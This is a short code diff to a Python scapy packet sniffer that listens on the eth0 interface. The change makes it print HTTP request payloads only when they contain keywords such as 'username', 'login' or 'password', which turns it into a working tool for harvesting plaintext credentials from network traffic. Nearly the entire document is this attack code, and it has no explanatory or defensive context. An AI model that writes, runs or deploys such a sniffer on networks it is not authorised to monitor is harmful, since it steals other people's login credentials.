@@ -1,6 +1,6 @@
-#!/usr/bin/env Python 2
+#!/usr/bin/env python3
 
-import  scapy.all as scapy
+import scapy.all as scapy
 from scapy.layers import http
 
 def sniff(interface):
@@ -9,6 +9,11 @@ def sniff(interface):
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)
+            load = packet[scapy.Raw].load
+            keywords = [b"username", b"user", b"uname", b"login", b"password", b"pass"]
+            for keyword in keywords:
+                if keyword in load:
+                    print(load)
+                    break
 
 sniff("eth0")
